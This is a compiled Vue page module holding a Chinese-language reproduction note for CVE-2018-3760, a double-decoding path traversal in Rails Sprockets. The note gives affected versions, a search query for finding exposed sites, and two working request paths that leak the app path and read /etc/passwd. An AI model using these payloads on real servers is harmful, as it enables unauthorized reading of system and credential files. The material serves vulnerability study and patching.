import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as t}from"./app-58e4a7d6.js";const s={},d=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Ruby On Rails 在开发环境下使用 Sprockets 作为静态文件服务器，Ruby On Rails 是著名 Ruby Web 开发框架，Sprockets 是编译及分发静态资源文件的 Ruby 库。</p><p>Sprockets 3.7.1 及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Sprockets &lt; 3.7.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Ruby On Rails&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>主页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206281114422.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>先获取绝对路径</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/assets/file:%2f%2f/etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206281115997.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再利用 POC 读取文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206281115231.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),n=[d];function r(l,c){return a(),i("div",null,n)}const u=e(s,[["render",r],["__file","Rails sprockets 任意文件读取漏洞 CVE-2018-3760.html.vue"]]);export{u as default};
